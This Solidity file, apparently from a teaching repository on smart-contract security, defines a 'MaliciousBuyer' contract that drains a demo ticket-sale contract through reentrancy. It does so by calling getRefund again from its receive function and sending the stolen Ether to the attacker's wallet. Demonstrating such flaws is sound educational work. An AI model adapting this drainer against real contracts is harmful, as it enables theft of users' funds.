// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

import "./VulnerableTicketSale.sol";

/// @notice A function vulnerable to a reentrancy attack can only be exploited
/// through the use of another smart contract as the attack relies on the
/// execution of the `receive' function of the malicious contract.
///
/// An attacker can use this contract to drain the funds from the vulnerable
/// one and send the stolen funds to his wallet.
contract MaliciousBuyer {

    /// @notice Must be the same as in the vulnerable contract.
    uint256 private constant TICKET_PRICE = 0.1 ether;

    /* State variables */

    VulnerableTicketSale private vulnerableContract;
    address private owner;

    /* Custom errors and function modifiers */

    error NotTheOwner();
    error ErrorRetrievingStolenFunds();

    modifier isOwner() {
        if (msg.sender != owner) {
            revert NotTheOwner();
        }
        _;
    }

    /* Functions */

    constructor(address payable vulnerableContractAddress) {
        owner = msg.sender;
        vulnerableContract = VulnerableTicketSale(vulnerableContractAddress);
    }

    /// @notice Start the attack!
    function stealFunds() external payable isOwner {

        // Buy one ticket from the contract so as to have a balance and be able
        // to call the getRefund function.
        vulnerableContract.buyTickets{value: TICKET_PRICE}(1);

        // Call the vulnerable getRefund function which will in turn call the
        // receive function.
        vulnerableContract.getRefund(1);

        // Send the stolen funds to the wallet of the attacker.
        (bool fundsStolen, ) = owner.call{value: address(this).balance}("");
        if (!fundsStolen) {
            revert ErrorRetrievingStolenFunds();
        }
    }

    /// @notice This function will be called when the vulnerable contract sends
    /// Ether to this contract.
    receive() external payable {
        // As long as the vulnerable contract has sufficient funds, we will ask
        // for a refund. This prevents the transaction from reverting if the
        // contract doesn't have enough funds to perform a refund.
        if (address(vulnerableContract).balance >= TICKET_PRICE) {
            vulnerableContract.getRefund(1);
        }
    }
}
